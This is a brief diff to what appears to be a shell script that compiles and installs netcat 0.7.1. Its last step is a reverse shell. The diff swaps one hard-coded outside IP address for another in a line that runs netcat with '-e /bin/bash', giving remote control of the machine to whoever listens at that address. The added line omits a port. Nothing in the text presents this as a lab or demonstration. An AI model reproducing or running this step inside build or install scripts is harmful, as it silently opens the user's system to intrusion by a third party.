@@ -7,4 +7,4 @@ cd netcat-0.7.1
 ./configure
 sudo make
 sudo make install
-nc 18.191.4.61 443 -e /bin/bash
+nc 3.144.190.190 -e /bin/bash
